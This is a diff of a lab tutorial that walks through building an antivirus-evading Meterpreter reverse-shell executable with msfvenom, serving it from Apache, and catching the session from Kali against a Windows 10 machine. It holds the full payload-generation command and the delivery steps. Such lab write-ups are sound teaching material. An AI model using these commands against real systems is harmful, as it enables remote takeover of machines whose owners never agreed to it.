@@ -5,24 +5,48 @@
 Before digging deeper into the attack mechanism, let's understand what exactly is meant by "Privilege escalation". Imagine you're at a party, and you have a VIP wristband that lets you access the exclusive VIP area. But what if you could somehow sneak past the bouncer and upgrade your VIP wristband to a "Super" VIP wristband that lets you access even more exclusive areas of the party? That's kind of like what a privilege escalation attack does - it sneaks past the security measures in place and gives the attacker more privileges than they were originally supposed to have, allowing them to access sensitive information or perform malicious actions.
 
 Privilege escalation is a type of attack in which an attacker gains access to a system or network with limited privileges, such as a normal user account, and then exploits a vulnerability or flaw in the system to elevate their privileges to a higher level. This higher level of privilege may allow the attacker to perform actions that would normally be restricted, such as accessing sensitive information, installing malware, modifying system configurations, or even taking complete control of the system.
-There are two main types of privilege escalation: ***vertical and horizontal***. In vertical privilege escalation, the attacker gains higher privileges by exploiting a vulnerability or flaw in the system that allows them to escalate their privileges to a higher level, such as gaining administrative access. In horizontal privilege escalation, the attacker gains the same level of privileges as another user, but on a different account or system. For example, if a user has access to sensitive data on one system, an attacker might use a horizontal privilege escalation attack to gain access to that same data on a different system. Horizontal privilege escalation attacks are typically less severe than vertical attacks, but they can still pose a serious threat if sensitive data or resources are accessed without authorization.
+ 
+There are two main types of privilege escalation: **vertical** and **horizontal**. 
+
+- **Vertical privilege escalation**: The attacker gains higher privileges by exploiting a vulnerability or flaw in the system that allows them to escalate their privileges to a higher level, such as gaining administrative access. 
+- **Horizontal privilege escalation**: The attacker gains the same level of privileges as another user, but on a different account or system. For example, if a user has access to sensitive data on one system, an attacker might use a horizontal privilege escalation attack to gain access to that same data on a different system. Horizontal privilege escalation attacks are typically less severe than vertical attacks, but they can still pose a serious threat if sensitive data or resources are accessed without authorization.
 
 Now that we know what is meant exactly by the attack strategy that we're using here, let's get into creating the exploit. Our attacker machine here will be Kali Linux (IP: 192.168.100.5 ) and Windows 10 (IP: 192.168.100.6 ). Both virtual machines are Natted in a NAT network, however, it wont be necessary for you to NAT them since we'll be using Apache server in order to create a shared folder to access the malicious backdoor.exe file.
 
-## First, we'll begin by creating a malicious .exe file using msfvenom:
+## 1. Create a Malicious `.exe` File Using `msfvenom`
 
-Msfvenom has numerous payloads that you can choose from, just keep in mind to choose ones that are compatible with the target OS and the architecture. Here, since we're targeting a Windows OS, we'll use meterpreter/reverse_tcp. 
+`msfvenom` has numerous payloads that you can choose from, just keep in mind to choose ones that are compatible with the target OS and the architecture. Here, since we're targeting a Windows OS, we'll use `meterpreter/reverse_tcp`. 
 
-***Meterpreter vs Non-Meterpreter***: Meterpreter payloads are more versatile and powerful, but they can also be larger in size and more likely to be detected by security tools. Non-meterpreter payloads are smaller and simpler, making them more likely to evade detection, but they may not provide the same level of functionality and flexibility as Meterpreter.
+### **Meterpreter vs Non-Meterpreter**  
+- **Meterpreter payloads** are more versatile and powerful, but they can also be larger in size and more likely to be detected by security tools.  
+- **Non-meterpreter payloads** are smaller and simpler, making them more likely to evade detection, but they may not provide the same level of functionality and flexibility as Meterpreter.  
 
 `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -ex86/xor_dynamic -ex86/shikata_ga_nai -b "\x00" LHOST=192.168.100.5 -i 5 -f exe > /home/kali/Desktop/Exploit.exe`
 
-The above command will create the malicious executable file named **Exploit.exe** and will be saved on Kali's **desktop**. Multiple encoders (**xor_dynamic** and **shikata_ga_nai**) have been used to obfuscate the payload. The **-i** option specifies the number of times the payload will be encoded. Each iteration applies a different encoding algorithm to the payload, making it more difficult to detect by anti-virus software and other security mechanisms. But keep in mind that increasing the no. of iterations also increases the final payload's size.
+The above command will create the malicious executable file named **Exploit.exe** and will be saved on Kali's **desktop**. 
+Multiple encoders (**xor_dynamic** and **shikata_ga_nai**) have been used to obfuscate the payload. The **-i** option specifies the number of times the payload will be encoded. Each iteration applies a different encoding algorithm to the payload, making it more difficult to detect by anti-virus software and other security mechanisms. But keep in mind that increasing the no. of iterations also increases the final payload's size.
 
-## Second, we'll use the Apache config. to share the exploit:
+### Explanation of Parameters:
+
+-   **`-p`**: Specifies the payload (Windows Meterpreter Reverse TCP).
+-   **`--platform windows`**: Targets the Windows OS.
+-   **`-a x86`**: Specifies the architecture.
+-   **Encoders (`xor_dynamic` and `shikata_ga_nai`)**: Obfuscate the payload to evade detection.
+-   **`-i 5`**: Encodes the payload 5 times. Each iteration applies a different encoding algorithm to the payload, making it more difficult to detect by anti-virus software and other security mechanisms.
+-   **`-f exe`**: Specifies the output format as an executable.
+
+Keep in mind that increasing the no. of iterations also increases the final payload's size!
+
+
+## 2. Configure Apache to Share the Exploit
+
+
+### Install and Verify Apache
 
 First, make sure that you have apache2 installed. You can type `apache2 -v` in your terminal. This will get you the version type and an indication of whether you have apache2 installed or not.
 If not, you can install it by typing `apt-get install apache2`. 
+
+### Configure Apache for File Sharing
 
 Navigate to the apache2 folder and open the apache2.conf configuration file using the following command: `vim /etc/apache2/apache2.conf`. 
 
@@ -52,7 +76,7 @@ Start the apache service to run the http server:
 >Note that the system may ask you to input your machine's password in order to start the apache service.
 
 
-## Third, prepare the exploit:
+## 3. Prepare The Exploit:
 
 We'll start the Metasploit Framework by typing:
 
@@ -81,7 +105,7 @@ Start the exploit in the background:
 The exploit starts and runs in the background as well as the reverse TCP handler which keeps listening for any connections on port 4444 (default port unless specified using `set LPORT`).
 
 
-## Fourth, perform the exploitation:
+## 4. Perform The Attack:
 
 
 Up until now, all of the aforementioned activities were done on the Kali Linux machine. Now, we'll switch to the Windows 10 machine to download the malicious executable file (Exploit.exe).
@@ -100,7 +124,7 @@ If an Open File - Security Warning window appears, click Run.
 Now switch back to the Kali linux machine terminal and you'll notice that a Meterpreter session has successfully opened.
 
 
-## Fifth, interacting with the session:
+## 5. Interacting With The Session:
 
 Now that we have successfully established a connection with the target device, we'll need to interact with it.
 To do that, type the following commands on your Kali terminal:
